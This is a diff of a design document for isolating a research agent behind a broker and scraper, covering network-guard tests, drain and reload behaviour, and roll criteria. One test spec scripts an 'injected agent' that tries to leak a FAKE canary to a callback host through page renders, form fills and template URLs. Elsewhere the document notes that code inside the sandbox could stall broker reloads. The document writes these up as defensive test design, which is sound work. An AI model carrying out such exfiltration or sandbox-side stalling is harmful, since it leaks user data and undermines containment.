@@ -813,11 +813,26 @@ Add a pytest `conftest` guard with two parts:
   patched to raise for any non-loopback URL. libcurl opens its own sockets in C, so a Python
   `socket` patch never sees them.
 
-This enforces the "CI tests do not call external services" directive mechanically. It also
-catches T-1: the live Exa call reached through `_direct_exa` (curl_cffi) in
-`tests/test_reject_no_leak.py`, whose own stubbing at `:347-357` patches only urllib. That test
-then gets fixed (stub `_direct_exa`) or deleted. A self-test asserts the guard fires for both
-paths. Add `broker/` to the bandit and semgrep paths in `.github/workflows/ci.yml:47`.
+This enforces the "CI tests do not call external services" directive mechanically. Every blocked
+attempt is **recorded and fails the test even if the code under test swallows the error**, so a
+guard hit cannot be absorbed by a broad `except`. A self-test asserts the guard fires for both
+paths. Coverage, stated honestly: it does **not** reach subprocesses (the lifecycle broker, shim
+children) or a curl redirect that follows `Location` to an outside host.
+
+What it actually caught when switched on: **19 scraper session tests issuing real DNS queries** for
+`x.test` / `example.com`. Reserved names now resolve to a local NXDOMAIN, which preserves those
+tests' outcomes without the lookup.
+
+**It does not "catch T-1", and that earlier claim was wrong.** `tests/test_reject_no_leak.py` is
+script-style (`case_*`, no `test_` functions), so pytest collects nothing from it and no guard
+installed by `conftest.py` ever runs against it — and its cases are stale besides: the scanner
+warm-up gate now refuses before `_direct_exa` is reached, and `scanner_reject_no_leak` fails on a
+missing `report_id`. Its two curl_cffi stubs were corrected anyway. Bringing that file under
+pytest means repairing out-of-date cases and is **out of scope here**; `tasks/session-constraints.md`
+already classes those scripts as operational checks to be run directly and diffed against a
+baseline, not as part of the suite.
+
+bandit already includes `broker/` and semgrep already scans `.`, so no CI path change is needed.
 
 - **Broker auth:**
   - missing, unknown, expired or revoked token → 401;
@@ -937,8 +952,16 @@ paths. Add `broker/` to the bandit and semgrep paths in `.github/workflows/ci.ym
   - a scripted "injected agent" plays the attack through the shims: `render_page(callback?k=FAKE)`,
     the same URL via `browse_act goto`, `fill` with an opaque FAKE string, a template `q` with
     `https://callback/?k=FAKE`, many small fills until the budget runs out;
-  - **pass** = every call refused with the expected reason, and the fake scraper's request log
-    contains no `FAKE` and no callback host.
+  - **pass** = every call refused with the expected reason; the typed-text budget caps the
+    many-small-fills step; and nothing the fake scraper or fake upstream received carries the whole
+    canary string or the callback host.
+
+    The earlier pass condition — "the scraper's request log contains no `FAKE`" — was unsatisfiable
+    next to the many-small-fills step in the same list: short fills are *allowed* by design
+    (§3.5), so fragments of the canary legitimately reach the scraper and only the budget stops
+    the sequence. Asserting their absence would have forced either deleting the budget step or
+    weakening the typed-text rule. The test must be falsifiable to be worth anything: confirm it
+    fails with the gate, the typed-text rule, or the typed budget switched off.
 
 ### 8.2 Security tooling (CI, existing)
 
@@ -1062,7 +1085,9 @@ Each item gets a red test first.
 - [ ] ~~`_SECRET_ENV` trim~~ — **moved to PR 4** (§12.1). Doing it in PR 2 would break the legacy
       branch that PR 2 still has to serve.
 - [ ] §8.1 `--clearenv` + exact env allowlist in `run-agent.sh`.
-- [ ] §8.1 conftest network guard covering both `socket` and `curl_cffi`; T-1 fixed.
+- [x] §8.1 conftest network guard covering both `socket` and `curl_cffi` (connect/connect_ex/sendto
+      + DNS; `Session.request`, `AsyncSession.request`, `Curl.setopt(URL)`). Not T-1 — see §8.1 for
+      why that file is out of the suite's reach, and for the subprocess/redirect gaps.
 - [ ] Budgets single-sourced in `broker/config.py` + drift test against `agent/CLAUDE.md`.
 - [ ] Session and artifact run binding (§4.3).
 
@@ -1097,7 +1122,8 @@ Anchors in this section:
 | The research-VM watchdog restarts the VM after 3 failed sshd probes, unless `/run/research-agent/active` is fresh. | nixos `research-agent-microvm-healthcheck.nix:62-110` | A drained restart must look "busy" to the watchdog, or it would fight the roll. |
 | The lane host cannot boot microVMs (no nested KVM). | nixos `tests/microvm.nix:24` | The switchover lane emulates the two VMs as NixOS test nodes (§12.5). |
 | `_secret()` resolves every secret env var → (`claude-token` only: `~/.claude/.credentials.json`) → **GNOME keyring**. | `server.py:440-457` | Removing the wrapper's env exports (nixos-B) does **not** remove the legacy key capability — the keyring still answers. The legacy branch must be env-only, and nixos-B must clear the keyed keyring entries (§12.4). |
-| The broker's `save_state()` runs **after** `server_close()` has joined in-flight request threads. | `broker/server.py:430-435` | A SIGKILL at `TimeoutStopSec` loses the entire run registry. The drain must persist *before* it starts waiting, not only after (§12.2). |
+| ~~The broker's `save_state()` runs **after** `server_close()` has joined in-flight request threads.~~ **Fixed.** | was `broker/server.py:430-435` | A SIGKILL at `TimeoutStopSec` would have lost the entire run registry. The drain now persists *before* it starts waiting as well as after (§12.2). Kept here because it is why the ordering is the way it is. |
+| `server_close()` also joined threads blocked *reading* an incomplete request, so a quiet or trickling client held the drain open indefinitely. **Fixed.** | measured: 14.1 s quiet, >30 s trickling | Anything in the research VM could stall every reload until `TimeoutStopSec` killed real in-flight work. The drain now waits only on fully-received requests and cuts the rest after a 2 s grace (§12.2). |
 | Slot files are opened `O_CREAT \| O_RDWR \| O_CLOEXEC, 0o600` by the MCP process (uid 1000). | `server.py:822` | Whoever creates a slot file first owns it. A root-run roll unit that creates one locks jonathan out with `EACCES` (§12.3). |
 | `_run_agent` — and therefore every rc=255 re-dial inside it — runs **inside** `with _vm_lock(...)`. | `server.py:1858-1860` | A re-dial can never re-enter a slot the roll has taken: the run never released it. The roll needs no hysteresis against re-dials (§12.3). |
 
@@ -1174,11 +1200,15 @@ when the pull later creates the file. Add to nixos-A:
      **unconditionally**. The oneshot does not compute or compare any code digest.
 
      **The service that owns the code does the comparison; root only acts on the answer.** On
-     `SIGHUP` the broker recomputes its own digest (`broker/digest.py`, covering `broker/*.py`
-     plus `scraper/urlpolicy.py`, hashed over paths **relative to the checkout root** so the value
-     does not change with the mount point — the broker sees the code at `/run/rb`). If the digest
-     is unchanged it treats the reload as a **no-op and keeps serving**: no drain, no re-exec. A
-     spurious path event therefore costs nothing.
+     `SIGHUP` the broker recomputes its own digest and, if it is unchanged, treats the reload as a
+     **no-op and keeps serving**: no drain, no re-exec. A spurious path event therefore costs
+     nothing.
+
+     The single implementation is **`scraper/digest.py`**, because `scraper/` is the only directory
+     both services see; `broker/digest.py` merely selects the broker's file set. That set is
+     `broker/*.py` plus `scraper/urlpolicy.py` **and `scraper/digest.py`** (the broker imports it).
+     Paths are hashed **relative to the checkout root**, so the value does not change with the
+     mount point — the broker sees the code at `/run/rb`, the scraper over its share.
 
      Two designs were rejected on the way here, for different reasons:
 
@@ -1212,7 +1242,12 @@ when the pull later creates the file. Add to nixos-A:
 `ExecReload=kill -HUP $MAINPID`, `TimeoutStopSec=210`, `StateDirectory=research-broker`,
 `StateDirectoryMode=0700`, and `Restart=on-failure` stays):
 
-1. On `SIGHUP` (and on `SIGTERM`) the broker sets `stopping`.
+1. The broker sets `stopping` on **`SIGTERM`, or on `SIGHUP` whose recomputed digest differs from
+   the one it loaded** (or whose tree cannot be read). A `SIGHUP` with an unchanged digest is a
+   **no-op**: the same process keeps serving, with no drain and no state write — see step 4's
+   rationale for why the oneshot can therefore reload unconditionally. The boot digest is taken
+   before the broker's own modules are imported, so a pull racing startup can only cause one extra
+   reload, never stale code passing as current.
 2. **Persist the run registry immediately, before any waiting.** Write
    `$STATE_DIRECTORY/runs.json`: token hashes, ledgers, budget counters, sid→run map, and
    absolute `expires`. Temp file, fsync, rename. Mode 0600 under a 0700 DynamicUser state dir.
@@ -1231,11 +1266,22 @@ when the pull later creates the file. Add to nixos-A:
    accepting. That was unreachable: 600 s > `TimeoutStopSec=210`, so under load systemd killed the
    process mid-wait. It also bought nothing — the backlog already prevents refusals, so there is
    no reason to keep accepting during a drain.
-4. **Finish in-flight requests.** Each upstream call has its own timeout, and the longest route
-   is `session/act` at 165 s broker-side (§2.3). Therefore `TimeoutStopSec=210`, which now
-   genuinely bounds the whole drain. The broker waits for the scraper's answer before exiting, so
-   **no scraper worker command is orphaned**: the scraper's own wait (150 s) and the worker budget
-   (120 s, `scraper/sessions.py:28-35`) are both inside it.
+4. **Finish in-flight requests — where "in flight" means *fully received*.** Each upstream call
+   has its own timeout, and the longest route is `session/act` at 165 s broker-side (§2.3).
+   Therefore `TimeoutStopSec=210`, which now genuinely bounds the whole drain. The broker waits
+   for the scraper's answer before exiting, so **no scraper worker command is orphaned**: the
+   scraper's own wait (150 s) and the worker budget (120 s, `scraper/sessions.py:28-35`) are both
+   inside it.
+
+   Connections still *sending* a request get `DRAIN_READ_GRACE_S` (2 s) and are then cut without
+   being dispatched. **This is a fix, not a nicety.** `server_close()` joins handler threads, and
+   a thread blocked *reading* an incomplete request joins only when the client relents — measured:
+   a client that connected and went quiet held the drain 14.1 s, and one sending a byte every 10 s
+   held it open past 30 s with no end in sight. Anything in the research VM could therefore stall
+   every broker reload until `TimeoutStopSec` SIGKILLed genuine in-flight work — a denial of
+   service against the switchover from inside the sandbox the switchover exists to contain.
+   Keep-alive is *not* a factor (every reply is HTTP/1.0 and closes); a test pins that so the
+   reasoning cannot silently rot.
 5. **Persist again**, so the handover reflects work that completed during the drain.
 6. Exit 0. The next queued connection activates the new code. It loads `runs.json`, drops
    expired runs, deletes the file, then serves.
@@ -1245,14 +1291,20 @@ when the pull later creates the file. Add to nixos-A:
 
 - **Shims:** each shim's HTTP timeout is its §2.3 value + 220 s (drain 210 s + start). An act
   therefore waits at most 180 + 220 s; that is latency, not failure.
-- **The MCP's run-registration client** (`server.py`, admin socket, written in the dual-mode PR):
-  connect timeout **≥ 240 s**, and it must **retry on `ENOENT` / `ECONNREFUSED`** with backoff for
-  the same budget rather than treating the first failure as final. Without this the drain is not
-  zero-downtime at all: §12.4 fails closed when "registration fails", and a bare `connect()` to the
-  admin socket during a reload is exactly that — so every research call started inside a 210 s
-  reload window would die with `research-broker unavailable`. The socket file is a systemd-owned
-  `AF_UNIX` listener, so during the reload the connection queues; the retry is only needed for the
-  instant between `server_close()` and the new process inheriting the fd.
+- **The MCP's run-registration client** (`server.py`, admin socket, written in the dual-mode PR)
+  splits its budget **by phase**, per §2.6:
+  - once `connect()` has succeeded, the **read** gets the full ≥240 s (drain 210 s + start). This
+    is the reload window: systemd holds the listening fd throughout, so the connection queues in
+    the backlog and simply waits for the next broker process.
+  - `ENOENT` / `ECONNREFUSED` mean systemd is *not* holding the listener, so they cannot be a
+    reload. Short retry (~15 s, covering a unit-restart race), then the era's verdict.
+  - deregistration is a single try on a ~5 s timeout, logged on failure, with the run TTL as the
+    backstop. It must never sit on the 240 s budget — that would delay returning an
+    already-finished result by up to a full drain.
+
+  Without the read budget the drain is not zero-downtime at all: §12.4 fails closed when
+  "registration fails", so every research call started inside a reload window would die with
+  `research-broker unavailable`.
 
 What a run sees: tokens and ledgers survive, so a run spanning a reload never gets
 `run not registered`. A non-graceful crash still loses state. That is a broker bug, not a
@@ -1316,11 +1368,27 @@ Algorithm:
    would re-dial never released one. The previous 60 s all-free window was guarding against a race
    that the lock structure already excludes.
 
-   **Scraper roll:** the criterion is the scraper's own reported state, not a clock. Roll when
-   `GET /health` reports **0 open sessions and 0 pending (un-pulled) artifacts** — two new
-   counters on that endpoint. The artifact pull happens after the slot is released
-   (`server.py:2501-2526`), so slot idleness alone does not mean the scraper is safe to restart;
-   its own queue depth does.
+   **Scraper roll:** the criterion is the scraper's own reported state, not a clock. `GET /health`
+   reports five fields — `code`, `code_on_disk`, `stale`, `open_sessions` and `pending_artifacts`
+   — and the roll waits for **`open_sessions == 0` and `pending_artifacts == 0`**. The artifact
+   pull happens after the slot is released (`server.py:2501-2526`), so slot idleness alone does not
+   mean the scraper is safe to restart; its own queue depth does. None of the five fields may start
+   the browser worker.
+
+   **`pending_artifacts` counts only artifacts belonging to a still-live run.** Orphans — artifacts
+   whose run has ended or crashed — are excluded. Without that exclusion the roll has a liveness
+   bug: un-pulled artifacts linger until the 30-minute TTL sweep, far beyond
+   `scraperQuietSeconds`, so a single crashed run would keep the counter non-zero through every
+   cap expiry and the scraper roll would never fire — which in turn means nixos-B's guest change
+   never lands and the contract step stalls indefinitely. The exclusion is principled rather than a
+   workaround: an artifact whose run is gone cannot be pulled by anyone, so a restart cannot lose
+   anything by discarding it.
+
+   `/health` is **unauthenticated**, so during the legacy era the research VM can read the
+   aggregate session and artifact counts. That is a small cross-run side channel (counts only, no
+   identifiers or content) and it is accepted for the transition; after the contract step the guest
+   reaches the scraper only through the broker. If it needs closing later, the fix is to move the
+   two counters behind the broker's admin surface, not to drop them.
 
    `scraperQuietSeconds` (default 300) survives only as a **safety cap**: if the counters have not
    reached zero within it, the roll reports and waits rather than restarting. It is an input, not
@@ -1336,7 +1404,7 @@ Algorithm:
 5. **Wait for ready.**
    - Research VM: `ssh-keyscan -p 2223 127.0.0.1` returns an ed25519 key, then
      `ssh … agent@127.0.0.1 true` succeeds (bounded at 600 s).
-   - Scraper: `GET 127.0.0.1:8123/health` is ok with the new code hash (bounded at 600 s).
+   - Scraper: `GET 127.0.0.1:8123/health` is ok and reports `stale: false` (bounded at 600 s).
 6. **Release.** Remove the marker and release the slot locks. Queued calls proceed.
 7. On timeout at step 5: keep the marker, leave the locks held, and notify through the existing
    failure channel. Queued calls keep waiting (up to their 1800 s) rather than dial a dead VM.
